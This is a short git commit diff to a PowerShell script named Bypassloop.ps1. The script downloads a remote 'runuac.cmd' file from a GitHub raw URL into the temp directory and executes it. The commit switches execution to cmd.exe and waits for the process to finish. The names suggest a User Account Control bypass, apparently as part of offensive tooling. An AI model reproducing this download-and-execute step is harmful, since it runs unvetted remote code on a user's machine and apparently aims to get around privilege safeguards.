5eb60f9f3c48abd362f83abea87c1d719e9776c0
43a1723 <hai1723notgay@gmail.com>
2024-06-07 12:04:10 +0700

    Update Bypassloop.ps1

--- Bypassloop.ps1
+++ Bypassloop.ps1
@@ -1,2 +1,3 @@
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/runuac.cmd" -OutFile "$temp\runuac.cmd"
-Start-Process -FilePath "$temp\runuac.cmd"
+$process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $temp\runuac.cmd" -PassThru -NoNewWindow
+$process.WaitForExit()
